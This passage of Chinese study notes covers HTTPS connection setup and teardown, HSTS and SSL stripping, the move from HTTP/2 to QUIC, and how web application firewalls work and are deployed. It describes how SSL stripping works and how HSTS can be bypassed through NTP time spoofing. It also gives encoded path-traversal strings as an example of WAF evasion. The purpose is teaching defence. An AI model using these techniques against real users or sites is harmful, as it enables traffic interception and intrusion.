上面这份清单是 TLS 记录层之上的所有内容。没有被加密的是：目标 IP 地址、端口号（443），以及握手阶段明文发送的 服务器域名（SNI）。所以中间人虽然读不到你在页面上干了什么，但知道你在访问哪个网站。这也是为什么 1.4 节那份实测能统计出「哪些 HTTP 会话被劫持」——他们看的是流量特征，不需要解密。

连接建立与关闭 PPT p.93–94 课本 p.298

1
建立 TCP 连接
「作为 HTTP 用户的代理程序（也是 TLS 的用户）首先向服务器的指定端口（443）发起 TCP 连接请求。」
2
TLS 握手
「成功建立 TCP 连接后，向服务器发送 TLS ClientHello，开始 TLS 握手过程。」
顺序不能颠倒：TLS 跑在 TCP 之上，所以是先 TCP 三次握手，再 TLS 握手——两轮握手叠加，这正是第 4 节 QUIC 想省掉的开销。
3
发第一个 HTTP 请求
「当 TLS 握手过程完成后，用户将发起第一次 HTTP 请求。此时，所有 HTTP 协议数据都要以 TLS 应用数据的形式通过 TLS 记录协议加密传输。在此过程中，要遵守 HTTP 协议规范，包括保留连接。」
课本补充了一个层次关系：「在 HTTP 层面，一个 HTTP 用户通过向下一层（TCP 或 SSL/TLS）发送一个连接请求来向服务器请求建立一条连接；在 TLS 层面，一个会话建立在一个 TLS 用户和一个 TLS 服务器之间，可以在任何时间支持一条或多条 TLS 连接。一条 TLS 连接请求的开始总是伴随着一条 TCP 连接的建立。」——「会话」和「连接」是两个层级，一个会话可复用多条连接，这是第 7 章的概念在这里的回声。
4
关闭：两端各发一个 close_notify
「关闭一条 HTTPS 连接要求关闭 TLS 与其对应的对端实体之间的连接，这意味着也要关闭 TLS 的下层 TCP 连接。在 TLS 层面，关闭连接的最好方式是两端都用 TLS 告警协议发出一个 close_notify 告警。」
为什么要「两端都发」：TLS 用 close_notify 明确宣告「我这边说完了」，是为了防止截断攻击——攻击者伪造一个 TCP FIN 把连接掐断，让接收方误以为消息完整结束。有了 close_notify，少了这一句就知道数据没收全。本页补注
!
「不完整的关闭」
「在发出 close_notify 后，一个 TLS 实体会立即关闭该连接，而不会等待它的对等实体发来 close_notify 告警，从而可能造成『不完整的关闭』。」课本还提醒：「一个 TLS 实体在关闭一条连接之后可能会选择再次使用这个会话，即恢复一条连接」，而且「HTTP 用户也必须能够应对这种情况，即潜在的 TCP 连接在没有事先的 close_notify 告警和 connection: close 指示的情况下被终止」。

另外课本提到 HTTP 层自己的关闭指示：「HTTP 用户或服务器用户可以通过在 HTTP 报文中填上 connection: close 来指示关闭一条连接，这意味着该连接将会在该条信息传输之后关闭。」所以关闭一条 HTTPS 连接涉及三层：HTTP 的 connection: close、TLS 的 close_notify、TCP 的四次挥手。

风险：①是否加密完全取决于用户输入——用户在地址栏敲 http://，或点了一个别人给的 http:// 链接，服务器就老老实实用明文回应，加密形同虚设；②Cookie 会跟着明文请求裸奔——只要 Cookie 没设 secure，任何一次 HTTP 请求都会把它带出去一次，一次就足以被劫持（对照 2.3 节）；③给 SSL 剥离攻击留了着陆点——中间人只要把用户发往 443 的意图降级成 80，服务器照样应答，用户很难察觉；④用户教育无效——大多数人不看地址栏那把锁。

3.4 ★ HSTS 与 SSL 剥离攻击 PPT p.96–97 课本 p.299

📖 HSTS 定义（PPT p.96 / 课本 p.299 原文）

HSTS 的全称是 HTTP Strict Transport Security，是由 IETF 提出的一种新的 Web 安全协议，其目的是强制客户端（如 Web 浏览器）使用 HTTPS 与服务器进行通信。使用 HSTS 协议的网站将保证浏览器始终使用 HTTPS 连接到服务器，不需要用户在浏览器的地址栏中手工输入 HTTPS。当客户端通过 HTTPS 向服务器发出请求时，服务器在返回的 HTTP 响应头中包含 Strict-Transport-Security 字段。

课本给的实际字段：

Strict-Transport-Security: max-age = 315360000; include SubDomains

「则意味着两点」（课本原文，两条都是考点）：

  1. 「在接下来的 315 360 000 秒（即一年）中，浏览器只要向 xxx 或其子域名发送 HTTP 请求，必须采用 HTTPS 来发起连接，即浏览器应自动将用户输入的 http://xxx 转换成 https://xxx；」
  2. 「在接下来的一年中，如果 xxx 服务器发送的 TLS 证书无效，用户不能忽略浏览器告警而继续访问网站。如果中间人使用自己的自签名证书来进行攻击，则浏览器会给出告警，通常情况下，许多用户会忽略告警，但是一旦服务器发送了 HSTS 字段，浏览器就不再允许用户忽略告警。」
🔑 第 2 条才是 HSTS 真正的杀手锏 本页点评

很多人只记得第 1 条「自动转 https」。但证书告警从「可忽略」变成「不可忽略」这一条，堵死的是整个中间人攻击链上最脆弱的一环——用户。技术上再完美的证书校验，只要留一个「仍然继续」按钮，就会被点。HSTS 的价值在于把这个按钮拿走了。课本习题第 17 题（酒店 Wi-Fi 弹证书告警）考的就是这个场景。

SSL 剥离攻击 PPT p.97 课本 p.299

📖 定义（课本原文）

HSTS 可以用来抵御 SSL 剥离攻击——「一种用来阻止浏览器与服务器之间创建 HTTPS 连接的中间人攻击方法，由 Moxie Marlinspike 在 2009 年的黑帽大会上提出」。之所以能抵御，「因为只要浏览器曾经与服务器创建过一次安全连接，之后浏览器会强制使用 HTTPS，即使 URL 链接中的 https 被替换成了 http」。

攻击：SSL 剥离怎么做的 本页补写

中间人坐在用户与服务器之间：对用户这一侧全程说 HTTP（把服务器返回页面里所有 https:// 链接改写成 http://），对服务器那一侧正常说 HTTPS。用户从头到尾没有看到任何证书告警——因为压根没有发生 TLS 握手，浏览器没什么可校验的。用户只会觉得「这个网站怎么没有小锁」，而绝大多数人不会注意。

防御：HSTS 为什么能挡住

浏览器记住了「这个域必须用 HTTPS」。此后即使中间人把链接改成 http://，浏览器在发出请求之前就自行改回 https——中间人连插手的机会都没有。

⚠ HSTS 自己的两个洞（课本 p.300 原文，简答常考）

「尽管使用 HSTS 后安全性得到了大幅提高，但第 4 种方式仍然存在中间人攻击的可能性：

  • 首次访问不受保护——「当用户首次访问目标网站时是不受 HSTS 保护的。这是因为首次访问时，浏览器还未收到服务器发来的 HSTS 要求，所以仍然可能通过 HTTP 进行访问。」（业界的补丁是 HSTS 预加载列表：把域名内置进浏览器发行版，从第 0 次就生效。本页补注）
  • 可以用改时间来绕过——「由于 HSTS 会在一定时间后失效（有效期由 max-age 指定），所以浏览器是否强制执行 HSTS 策略取决于当前系统时间。攻击者可以通过伪造网络时间协议（NTP）消息来更改浏览器主机的系统时间来绕过 HSTS。」

第二条很值得玩味：一个 Web 安全机制的有效性，最终依赖于时间同步协议的安全性。安全链条的强度取决于最弱的一环，而那一环常常在你想不到的地方。

4.1 HTTP 一路改到 3.0 都在躲什么 课本 p.300

课本先交代动机：「目前 Web 服务器和浏览器之间使用的 HTTP 协议基本上都是使用 TCP 协议作为其传输协议的，相应地 HTTPS 也是在 HTTP 和 TCP 之间增加一个 SSL/TLS 协议来实现浏览器和服务器之间的安全传输的。由于 TCP 协议的面向连接特性所带来的一系列开销问题，学术界和工业界也在不断对 HTTP 协议进行改进，并探索使用 UDP 作为 HTTP 协议的传输协议的可能性。」

0.9
HTTP 0.9（1991 年发布）
最初的 HTTP。
1.1
HTTP 1.1（1999 年发布）：两项性能改进，各留一个尾巴

① keep-alive——「为解决每次 HTTP 请求均需建立一条 TCP 连接的问题，加入 keep-alive 机制复用一部分 TCP 连接」。尾巴：「但在域名分片等情况下仍然需要建立多条连接」。

② 管道（pipeling）——「为解决 HTTP 请求-响应串行进行所带来因为一次请求阻塞导致后续请求无法进行的问题，增加了管道机制，即浏览器可以一次发出多个请求（在同一个域名、同一条 TCP 连接上）」。尾巴：「但管道机制要求返回是按序的，那么前一个请求如果很耗时（如处理大图片），那么后面的请求即使服务器已经处理完，仍会等待前面的请求处理完才开始按序返回」。

这个尾巴有个名字叫「队头阻塞」（head-of-line blocking）——一整章后面的改进都在跟它较劲。术语为本页补注
S
SPDY（Google，2009 年公开）
「为了解决 HTTP 效率不高的问题，谷歌于 2009 年公开了自行研发的 SPDY 协议。该协议在延迟降低、HTTP 协议头（header）压缩方面进行了改进，并在其 Chrome 浏览器中进行了应用。」
2
HTTP/2（2015 年，RFC 7540 + RFC 7541）

「以 SPDY 3 协议为基础，2015 年 IETF 推出了新的 HTTP 协议标准：RFC 7540（Hypertext Transfer Protocol version 2）和 RFC 7541（HPACK - Header Compression for HTTP/2），这就是 HTTP 2.0，简称 HTTP/2。」很多浏览器（Chrome、Firefox、Edge、Safari）和服务器（Apache、Nginx、IIS、CloudFlare）已经支持。

「与 HTTP/1 相比，HTTP/2 保留了 HTTP 方法、状态码与语义等方面的内容，主要变化在：①引入了多路复用技术：同域名下所有通信都在单个连接上完成，该连接可以承载任意数量的双向数据流，每个数据流都以消息的形式发送，而消息又由一个或多个帧组成，多个帧之间可以乱序发送，根据帧首部的流标识可以重新组装；②采用二进制格式传输数据，而非 HTTP/1 的文本格式，二进制协议解析起来更高效；③在客户端和服务器端使用「首部表」来跟踪和存储之前发送的键-值对，对于相同的数据，不再通过每次请求和响应发送，大大降低 HTTP/1 中的重复头部开销。」

!
HTTP/2 没解决、甚至变糟的那件事
课本原文：「尽管 HTTP/2 解决了很多之前旧版本的问题，性能已得到了很大提升，但是仍然存在问题，比如，HTTP/2 使用了多路复用，一般来说同一域名下只需要使用一个 TCP 连接，但当这个连接中出现丢包时，那就会导致 HTTP/2 的性能表现情况反而不如 HTTP/1 了。」
为什么会「反而不如」：HTTP/1 开好几条 TCP 连接，一条丢包只堵一条；HTTP/2 把所有流塞进一条 TCP，TCP 为了保证「按序交付」，一个包丢了就把后面所有已经收到的数据全都压在缓冲区里不交给上层——于是一个包的丢失堵住了全部数据流。队头阻塞从应用层被赶到了传输层，而且更狠了。课本紧接着点破：「出现这一情况的根本原因还是在 HTTP 使用的 TCP 协议上」。机理为本页补写
3
QUIC / HTTP/3
「为此，Google 设计了一个基于 UDP 的低时延传输协议 QUIC（Quick UDP Internet Connection）。2016 年 11 月，IETF 召开了第一次 QUIC 工作组会议，这也意味着 QUIC 开始了它的标准化过程。基于 QUIC 的 HTTP 协议称为 HTTP over QUIC，也称『HTTP/2-encrypted-over-UDP』。」
为什么换成 UDP 就能解决：UDP 本身不保证顺序、不保证可靠——正因为它什么都不做，QUIC 才能在应用层自己实现「按流独立的可靠性」：某个流丢包只重传那个流，其他流照跑。不是 UDP 更快，而是 UDP 不挡路。本页补写

4.2 QUIC 的四项主要功能 课本 p.301

10 RTT

「使用类似 TCP 的快速打开技术，缓存当前会话的上下文，在下次恢复会话的时候，只需要将之前的缓存传递给服务端验证通过就可以进行传输。」
对照 3.2 节：HTTPS 要「TCP 三次握手 + TLS 握手」两轮才能发第一个字节；QUIC 在恢复会话时可以做到「第一个包就带数据」。

2多路复用

「同一个 QUIC 连接上可以创建多个 stream 来发送多个 HTTP 请求，由于 QUIC 是基于 UDP 的，一条连接上的多个 stream 之间没有依赖，所以不存在 HTTP/2 中的问题。」
——这一句直接回应上面 HTTP/2 的队头阻塞。

3前向纠错

「为提高可靠性以及降低重传所带来的开销，QUIC 增加了前向纠错机制。」
即多发一点冗余数据，丢了几个包能直接算出来，不用等重传——用带宽换时延。本页补注

4报文加密认证 ★

「QUIC 采用 Diffie-Hellman 密钥交换算法进行双向认证并协商会话密钥，除了个别报文，如 PUBLIC_RESET 和 CHLO，所有报文头部都是经过认证的，报文体都是经过加密的。可以将 QUIC 看作是安全、可靠、轻量级传输层协议。」
这一条是本节的「安全」考点：QUIC 把加密内建进了传输协议，不像 HTTPS 那样是「HTTP + 一层 TLS」的拼装。

追问PPT p.100 问的「HTTPS 有什么不足之处？」完整作答

本页作答分成效率和安全两类，前者是本节的主线，后者是第 3 节留下的：

一、效率上的不足（QUIC 要解决的）

  1. 建连贵：TCP 三次握手 + TLS 握手，两轮往返之后才能发第一个字节。移动网络下 RTT 大，这个代价很显眼。
  2. 队头阻塞：HTTP/2 把所有流压进一条 TCP 连接，TCP 的按序交付使得一个丢包堵住全部流，丢包率高时性能甚至不如 HTTP/1（课本原话）。
  3. 连接与 IP 绑定：TCP 连接由四元组标识，手机从 Wi-Fi 切到 4G，IP 一变连接就断，要全部重来。（QUIC 用连接 ID 而非四元组标识连接，可以无缝迁移。本页补）
  4. 加密与传输分层带来的重复：TLS 有自己的一套握手和序号，TCP 也有，两层各做一遍。

二、安全上的不足（HSTS 与部署方式要解决的）

  1. 只保护「传输」这一段——第 2 节的七种应用层漏洞，HTTPS 一个都挡不住（单选第 10 题就考这个）。
  2. 能被降级——只要 80 端口还开着，就有 SSL 剥离攻击的余地（第 3.3 节前三种部署方式）。
  3. 依赖用户不点「仍然继续」——证书告警可以被忽略，直到 HSTS 把这个选项拿掉。
  4. 信任根 CA 体系——只要有一个 CA 被攻破或被迫签发，或者受害者的信任列表被塞进一张假根证书，整个体系就被绕过。这正是习题 16（Fiddler）和 17（酒店 Wi-Fi）两道题的原理。
  5. 不隐藏元数据——目标 IP、端口和 SNI 里的域名仍是明文，「你访问了哪个网站」瞒不住。

一句话：HTTPS 解决的是「这条管子里的东西别人看不见改不了」；它解决不了「管子两头的程序写错了」，也解决不了「管子本身建得慢」。前者交给第 2 节和第 5 节，后者交给 QUIC。

0day 意味着还没有补丁——代码改不了、厂商还没发版。此时唯一能做的就是在请求进入应用之前把它拦住，这叫虚拟补丁。这正是 WAF 存在的核心理由：它不修漏洞，它买时间。回想 PPT 开篇的 Log4j 事件——从漏洞公开到全网打完补丁要几个月，那几个月里靠的就是这一层。本页补写

5.3 ★ 基本原理与两类分析方法 PPT p.107 课本 p.302 — 简答 13

课本原文：「WAF 主要提供对 Web 应用层数据的解析，对不同的编码方式做强制多重转换还原为可分析的明文，对转换后的消息进行深度分析。主要的分析方法有两类，一类是基于规则的分析方法，另一类是异常检测方法。」

⚠ 「强制多重转换还原为明文」这一句别读过去了

同一个 ../ 可以写成 %2e%2e%2f、%252e%252e%252f（双重编码）、Unicode 变体……如果 WAF 只按原文匹配规则，随便换个编码就绕过去了（对照 2.5 节的编码绕过）。所以 WAF 必须反复解码直到不再变化，再拿解出来的明文去匹配规则。这也解释了为什么 WAF 的规则总是滞后：攻击者永远在找新的编码组合。

① 基于规则的分析方法
② 异常检测方法

怎么做（课本原文）：「对每一个会话都要经过一系列的安全检查，每一项检查都由一条或多个检测规则组成，如果检测没通过，请求就会被认为非法并拒绝。」

优点：「主要针对的是已知特征的 Web 攻击，对已知攻击的检测比较准确。」

缺点：「无法检测未知攻击特征的攻击，且检测规则的配置比较复杂。」

怎么做（课本原文）：「从 Web 服务自身的业务特征角度，通过一段时间的用户访问，记录常用网页的访问模式，如 URL 链接参数类型和长度、form 参数类型和长度等。学习完毕，定义出一个网页的正常访问模式，如果有用户突破了这个模式，WAF 就会根据预先定义的方式预警或阻断。」

「此外，WAF 还可以利用爬虫技术，主动分析整个 Web 站点，并建立正常状态模型，或主动去扫描并根据结果生成防护规则。」

优缺点：「主要优点是可以检测未知攻击，缺点是误报率比较高。」

🔑 两种方法是一对经典权衡（第 13 章 IDS 里还会遇到同一组概念）

规则法 = 黑名单思维：「长这样的是坏人」→ 准，但只认识见过的。
异常检测 = 白名单思维：「不长这样的都可疑」→ 能抓新的，但会冤枉好人。
这就是「漏报」与「误报」此消彼长的关系。实际产品两种都上：规则法打底保证准确率，异常检测兜底覆盖未知。

课本还补了一句新方法：「此外，近年来出现的基于人工智能语义分析方法能够基于上下文逻辑实现攻击检测，还原出经过层层伪装变形的攻击向量，并从编码的基因层面识别和判断其危害程度，从而提升对网络攻击行为判断的准确率，降低误报率，并能够检测未知安全威胁。」——本质上是想同时拿到上面两栏的优点。

5.4 三种部署模式 PPT p.108–110 课本 p.302

PPT p.108 原文：「WAF 的部署模式有三种：反向代理、透明代理、旁路。常用的是反向、透明两种模式，因为旁路只有监听功能，不能对访问进行拦截、没有防护能力，因此使用的较少。」

1反向代理 p.109

形态：WAF 本身就是那台「服务器」——用户访问的 IP 就是 WAF 的 IP，它检查完再把请求转给后面真正的原始服务器（图上后面还有一台防火墙和三台原始服务器）。

特点本页补：要改 DNS 或 IP 配置；但因为它是 TLS 的端点，能直接看到 HTTPS 明文，还能顺带做负载均衡（对照 p.104 图里的「Web 负载均衡」）。防护能力最强，改造量最大。

2透明代理 p.110

形态：串在链路中间，用户和服务器都感觉不到它的存在（图上它就是防火墙和原始服务器之间的一个虚线框）。

特点本页补：不用改任何网络配置，接上去就能用，上线最快；但要处理 HTTPS 就得单独配置证书解密。常用于「已建成的系统临时加防护」。

3旁路

形态：不在流量路径上，靠交换机镜像口复制一份流量来看。

特点：PPT 原文——「只有监听功能，不能对访问进行拦截、没有防护能力，因此使用的较少」。这一条正好和单选 12 里的 IDS 对应：旁路的 WAF 退化成了一个 IDS。

📖 课本 p.302 的收尾（对部署的额外要求）

「WAF 部署在 Web 服务器的前面，一般为串行接入，不仅在硬件性能上要求高，而且不能影响 Web 服务，同时还要与负载均衡、Web Cache 等 Web 服务器前的常见产品协调部署。」
